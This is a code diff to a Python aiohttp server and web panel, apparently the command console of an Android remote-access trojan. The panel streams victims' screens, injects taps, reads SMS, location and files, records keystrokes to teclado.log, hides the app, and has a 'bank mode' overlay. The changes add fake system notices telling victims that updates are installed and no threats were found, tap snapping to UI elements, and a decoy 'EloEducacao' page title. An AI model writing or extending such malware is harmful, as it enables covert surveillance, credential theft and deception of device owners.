@@ -2,7 +2,7 @@
 import asyncio, json, os, socket, time
 from aiohttp import web, WSMsgType
 
-TOKEN = "3f7cm0ygvhr5w8"
+TOKEN = "m4t7k2p9x6v3n8b5z1q0w7r2"
 DEVS = {}
 VIEW = {}
 BUSY = set()
@@ -27,7 +27,7 @@ def devlist():
              "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]
 
 PAGE = r"""<!doctype html><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1"><title>aval</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content=no-referrer><title>EloEducacao</title>
 <style>
 *{box-sizing:border-box}
 body{margin:0;background:#0d0f12;color:#c9d1d9;font:12px/1.4 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
@@ -57,6 +57,8 @@ input{flex:1;cursor:text}
 .row.edit{border-left:2px solid #3fb950;padding-left:5px}
 .row.money span:first-child{color:#3fb950;font-weight:600;font-size:13px}
 #klist{font:11px monospace;white-space:pre-wrap;word-break:break-all}
+#wrap.zoom{overflow:auto;display:block}
+#wrap.zoom #scr{flex:none;height:auto}
 .kh{color:#58a6ff;margin:6px 0 2px;border-bottom:1px solid #1a2028;padding-bottom:2px}
 .krow{padding:1px 0;color:#c9d1d9}.krow b{color:#8b949e;font-weight:400}
 .tap{position:fixed;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid #58a6ff;border-radius:50%;pointer-events:none;animation:f .42s ease-out forwards}
@@ -72,16 +74,22 @@ input{flex:1;cursor:text}
 <button onclick="c('sms')">SMS</button><button onclick="c('loc')">Local</button>
 <button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
 <button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
-<button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
+<button onclick="zoom(-1)">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)">+</button><button id=mg onclick="mag=!mag;this.style.opacity=mag?1:.4">ima</button><button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
 <button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button>
 <button onclick="banco()">Modo banco</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
 </header>
 <main><div id=wrap><img id=scr><div id=st></div></div>
 <aside>
-<div id=tabs><b class=on data-t=log>log</b><b data-t=txt>texto</b><b data-t=tecla>tecla</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
+<div id=tabs><b class=on data-t=log>log</b><b data-t=txt>texto</b><b data-t=tecla>tecla</b><b data-t=aviso>aviso</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
 <div id=body>
 <div id=arqbar style="display:none"><div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div></div>
 <div id=tlist style="display:none"></div>
+<div id=avbar style="display:none">
+<div class=ln><input id=avt value="Atualizacao do sistema"></div>
+<div class=ln><input id=avx placeholder="texto do aviso"></div>
+<div class=ln><button onclick="mandaAviso() ">enviar aviso</button><button onclick="avPreset(0)">update pronto</button></div>
+<div class=ln><button onclick="avPreset(1)">sincronizando</button><button onclick="avPreset(2)">backup concluido</button><button onclick="avPreset(3)">verificacao ok</button></div>
+</div>
 <div id=kbar style="display:none"><div class=ln><span class=sm>gravando no teclado.log</span>
 <button onclick="kpause=!kpause;this.textContent=kpause?'retomar':'pausar'">pausar</button>
 <button onclick="fetch('/keys/clear?t='+T)">limpar</button>
@@ -101,12 +109,13 @@ input{flex:1;cursor:text}
 <script>
 const T=new URLSearchParams(location.search).get('t')||'';
 const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),out=$('#out');
-let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard',pend=null,tmr=null,kt=null,kpause=false,kn=0;
+let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard',pend=null,tmr=null,kt=null,kpause=false,kn=0,z=1,mag=true,nos=[];
 const log=x=>{out.textContent+=x+'\n';out.scrollTop=out.scrollHeight};
 function co(){
   w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
   w.binaryType='arraybuffer';
-  w.onopen=()=>{log('[painel ok]');setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
+  w.onopen=()=>{log('[painel ok]');setInterval(()=>{if(sel&&mag&&tabNow!=='txt')c('tree')},2600);
+setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
   w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
   w.onmessage=e=>{
     if(typeof e.data!=='string'){frame(e.data);return}
@@ -128,7 +137,7 @@ function co(){
       else if(x.t==='apps'&&tabNow==='apps'){out.textContent=x.o;out.scrollTop=0}
       else if(x.t==='ls'){lista(x.o)}
       else if(x.t==='dl'){baixa(x.o)}
-      else if(x.t==='tree'){if(tabNow==='txt')renderTree(x.o)}
+      else if(x.t==='tree'){nos=x.o||[];if(tabNow==='txt')renderTree(x.o)}
       else if(x.t==='k'){if(tabNow==='tecla'&&!kpause)kcarrega()}
       else if(x.t==='info'&&tabNow==='info'){out.textContent=x.o}
       else log(x.t+': '+(x.o||''))}
@@ -140,6 +149,7 @@ function frame(d){
   i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null};i.src=u;
   if(recs&&recs.cv){recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
 }
+setInterval(()=>{if(sel&&mag&&tabNow!=='txt')c('tree')},2600);
 setInterval(()=>{
   if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
   else if(!lf||Date.now()-lf>2500){st.textContent='sem frames';dot.className='dot warn'}
@@ -165,7 +175,24 @@ function pt(e){
   const x=Math.round((e.clientX-ox)/s*((inf.w||nx)/nx));
   const y=Math.round((e.clientY-oy)/s*((inf.h||ny)/ny));
   return{x:Math.min(Math.max(0,x),inf.w||x),y:Math.min(Math.max(0,y),inf.h||y)}}
-let dn=null,t0=0;
+function snap(p){
+  if(!mag||!nos.length)return p;
+  let b=null,d=1e9;
+  nos.forEach(n=>{if(!n.c&&!n.e)return;
+    const dd=Math.hypot(n.x-p.x,n.y-p.y);if(dd<d){d=dd;b=n}});
+  return (b&&d<70)?{x:b.x,y:b.y}:p}
+function zoom(n){z=Math.min(4,Math.max(1,z+n));
+  const wr=$('#wrap');wr.classList.toggle('zoom',z>1);
+  i.style.width=z>1?(z*100)+'%':'';
+  $('#z').textContent=z+'x'}
+function mandaAviso(){c('aviso',{ti:$('#avt').value,tx:$('#avx').value})}
+function avPreset(n){
+  const a=[['Atualizacao do sistema','Atualizacao instalada. Reinicie o aplicativo.'],
+    ['Servicos do sistema','Sincronizando dados da conta...'],
+    ['Backup do sistema','Backup concluido com sucesso.'],
+    ['Verificacao de seguranca','Nenhuma ameaca encontrada.']][n];
+  $('#avt').value=a[0];$('#avx').value=a[1];mandaAviso()}
+let dn=null,t0=0,env=null,jaEnviado=false;
 function mark(p){
   const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
   const s=Math.min(r.width/nx,r.height/ny)||1;
@@ -173,8 +200,14 @@ function mark(p){
   d.style.left=(r.left+(r.width-nx*s)/2+p.x/((inf.w||nx)/nx)*s)+'px';
   d.style.top=(r.top+(r.height-ny*s)/2+p.y/((inf.h||ny)/ny)*s)+'px';
   document.body.appendChild(d);setTimeout(()=>d.remove(),420)}
-i.onmousedown=e=>{dn=pt(e);t0=Date.now();mark(dn)};
-i.onmouseup=e=>{if(!dn)return;const u=pt(e),m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
+i.onmousedown=e=>{dn=snap(pt(e));t0=Date.now();jaEnviado=false;mark(dn);
+  clearTimeout(env);env=setTimeout(()=>{if(!dn)return;jaEnviado=true;
+    c('touch',{x:dn.x,y:dn.y})},130)};
+i.onmousemove=e=>{if(!dn)return;const u=snap(pt(e));
+  if(Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y)>18)clearTimeout(env)};
+i.onmouseup=e=>{clearTimeout(env);if(!dn)return;const u=snap(pt(e));
+  const m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
+  if(jaEnviado&&m<18){dn=null;return}
   if(m<18&&Date.now()-t0>480)c('long',{x:u.x,y:u.y});
   else if(m<18)c('touch',{x:u.x,y:u.y});
   else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});dn=null};
@@ -194,8 +227,10 @@ function tab(n){tabNow=n;
   $('#tlist').style.display=n==='txt'?'block':'none';
   out.style.display=(n==='arq'||n==='txt')?'none':'block';
   clearInterval(tmr);
-  if(n==='txt'){c('tree');tmr=setInterval(()=>{if(tabNow==='txt')c('tree')},1300)}
+  if(n==='txt'){c('tree');tmr=setInterval(()=>{if(sel&&mag&&tabNow!=='txt')c('tree')},2600);
+setInterval(()=>{if(tabNow==='txt')c('tree')},1300)}
   if(n==='tecla'){kcarrega();kt=setInterval(kcarrega,2000)}
+  $('#avbar').style.display=n==='aviso'?'block':'none';
   if(n==='apps')c('apps');if(n==='arq')ls();if(n==='info')c('info')}
 function kdesenha(linhas){
   const f=$('#klist');f.innerHTML='';
@@ -381,6 +416,7 @@ async def keys_dl(req):
     return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})
 
 async def health(req):
+    if not ok(req): raise web.HTTPForbidden(text="token invalido")
     return web.json_response({"ok": True, "devices": devlist()})
 
 def local_ip(dst):
